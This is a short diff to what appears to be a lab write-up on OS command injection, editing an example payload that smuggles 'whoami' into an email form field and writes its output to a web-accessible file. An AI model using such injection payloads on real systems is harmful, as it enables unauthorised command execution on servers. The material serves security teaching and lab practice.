@@ -62,7 +62,7 @@ to execute, etc....
 
 But here in this lab it's gonna be:
 ```shell
-x||whoami > /var/www/images/whodat.txt||&
+&email=foo||whoami > /var/www/images/whodat.txt||&
 ```
 <br>
 
